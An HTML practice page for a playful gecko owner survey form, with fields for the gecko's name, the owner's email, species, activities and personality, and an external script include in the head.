<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
	<script src="https://lint.page/kit/4d0fe3.js" crossorigin="anonymous"></script>
    <title>Gecko Survey</title>
  </head>

  <body>
    <h1 id="title">Gecko Habitat Survey 🦎</h1>
    <p id="description">
      Thanks for helping us improve the ultimate gecko experience!
    </p>

    <form id="survey-form">
      
      <label id="name-label">What is your gecko's name?</label>
      <input id="name" type="text" placeholder="e.g. Sticky Joe" required>

      <label id="email-label">Owner Email</label>
      <input id="email" type="email" placeholder="gecko.lover@email.com" required>

      <label id="number-label">How many geckos do you own?</label>
      <input id="number" type="number" min="1" max="50" placeholder="2">

      <label for="dropdown">Favorite Gecko Species</label>
      <select id="dropdown">
        <option id="op1">Leopard Gecko</option>
        <option id="op2" selected>Crested Gecko</option>
        <option id="op3">Tokay Gecko</option>
      </select>

      <fieldset>
        <legend>Is this your first time owning a gecko?</legend>
        <input id="yes-option" type="radio" name="gecko-owner" value="yes" />
        <label for="yes-option">Yes</label>

        <input id="no-option" type="radio" name="gecko-owner" value="no" />
        <label for="no-option">No</label>
      </fieldset>

      <p>What does your gecko love to do?</p>
      <input type="checkbox" value="climbing"> Climbing walls</input><br>
      <input type="checkbox" value="hiding"> Hiding in rocks</input><br>
      <input type="checkbox" value="eating"> Hunting insects</input><br>

      <p>Tell us about your gecko’s personality:</p>
      <textarea cols="30" rows="5" placeholder="Lazy? Energetic? Escape artist?"></textarea>

      <br><br>
      <button id="submit">Submit 🦎</button>
    </form>
  </body>
</html>
